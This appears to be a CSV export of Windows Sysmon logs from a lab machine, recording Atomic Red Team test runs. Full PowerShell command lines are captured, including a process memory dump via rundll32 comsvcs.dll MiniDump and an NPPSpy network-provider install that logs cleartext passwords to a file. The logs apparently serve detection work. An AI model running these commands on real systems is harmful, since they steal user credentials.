      <Data Name=""Hashes"">MD5=57A6B4BDF247C1A6CA08AC09A8F9B742,SHA256=98D37EFF504A7ADB864131EA4A042AAF4D79C4356960A8AB2FA656CC59AEC014,IMPHASH=5C68DE198B5D2DD5C1129782AD19676C</Data>
      
            
      <Data Name=""ParentProcessGuid"">{f57bd86a-40ce-658c-9102-000000000f00}</Data>
      
            
      <Data Name=""ParentProcessId"">7296</Data>
      
            
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)
if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }
C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full}</Data>
      
            
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 15:20:46.358,,,11,19665,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-40ce-658c-9102-000000000f00},3588,7296,,-,2023-12-27T15:20:46.3708148Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_4o1yp2f5.zyq.ps1,11,,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:20:46.358,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>11</EventID>
      
            
      <Version>2</Version>
      
            
      <Level>4</Level>
      
            
      <Task>11</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:20:46.3708148Z""/>
      
            
      <EventRecordID>19665</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:20:46.358</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-40ce-658c-9102-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">7296</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_4o1yp2f5.zyq.ps1</Data>
      
            
      <Data Name=""CreationUtcTime"">2023-12-27 15:20:46.358</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)
if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }
C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,1,19664,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},3288,-,{f57bd86a-40ce-658c-9102-000000000f00},3588,7296,Microsoft® Windows® Operating System,-,2023-12-27T15:20:46.2617498Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:20:46.260,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:20:46.2617498Z""/>
      
            
      <EventRecordID>19664</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:20:46.260</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-40ce-658c-9102-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">7296</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">Windows PowerShell</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      
            
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)
if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }
C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full}</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      
            
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      
            
      <Data Name=""ParentProcessId"">3288</Data>
      
            
      <Data Name=""ParentImage"">-</Data>
      
            
      <Data Name=""ParentCommandLine"">-</Data>
      
            
      <Data Name=""ParentUser"">-</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 15:20:43.397,,,11,19663,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-40cb-658c-8f02-000000000f00},3588,10708,,-,2023-12-27T15:20:43.4049475Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_m5p0tkym.yrf.ps1,11,,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:20:43.397,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>11</EventID>
      
            
      <Version>2</Version>
      
            
      <Level>4</Level>
      
            
      <Task>11</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:20:43.4049475Z""/>
      
            
      <EventRecordID>19663</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:20:43.397</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-40cb-658c-8f02-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">10708</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_m5p0tkym.yrf.ps1</Data>
      
            
      <Data Name=""CreationUtcTime"">2023-12-27 15:20:43.397</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\NPPSPY.dll\"""" -Destination \""""C:\Windows\System32\""""
$path = Get-ItemProperty -Path \""""HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order\"""" -Name PROVIDERORDER
$UpdatedValue = $Path.PROVIDERORDER + \"""",NPPSpy\""""
Set-ItemProperty -Path $Path.PSPath -Name \""""PROVIDERORDER\"""" -Value $UpdatedValue
$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy -ErrorAction Ignore
$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name \""""Class\"""" -Value 2 -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name \""""Name\"""" -Value NPPSpy -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name \""""ProviderPath\"""" -PropertyType ExpandString -Value \""""%%SystemRoot%%\System32\NPPSPY.dll\"""" -ErrorAction Ignore
echo \""""[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\NPPSpy.txt\""""}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,1,19662,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},3288,-,{f57bd86a-40cb-658c-8f02-000000000f00},3588,10708,Microsoft® Windows® Operating System,-,2023-12-27T15:20:43.2530883Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:20:43.251,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:20:43.2530883Z""/>
      
            
      <EventRecordID>19662</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:20:43.251</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-40cb-658c-8f02-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">10708</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">Windows PowerShell</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      
            
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {Copy-Item \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\NPPSPY.dll\"""" -Destination \""""C:\Windows\System32\""""
$path = Get-ItemProperty -Path \""""HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order\"""" -Name PROVIDERORDER
$UpdatedValue = $Path.PROVIDERORDER + \"""",NPPSpy\""""
Set-ItemProperty -Path $Path.PSPath -Name \""""PROVIDERORDER\"""" -Value $UpdatedValue
$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy -ErrorAction Ignore
$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name \""""Class\"""" -Value 2 -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name \""""Name\"""" -Value NPPSpy -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name \""""ProviderPath\"""" -PropertyType ExpandString -Value \""""%%SystemRoot%%\System32\NPPSPY.dll\"""" -ErrorAction Ignore
echo \""""[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\NPPSpy.txt\""""}</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      
            
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      
            
      <Data Name=""ParentProcessId"">3288</Data>
      
            
      <Data Name=""ParentImage"">-</Data>
      
            
      <Data Name=""ParentCommandLine"">-</Data>
      
            
      <Data Name=""ParentUser"">-</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
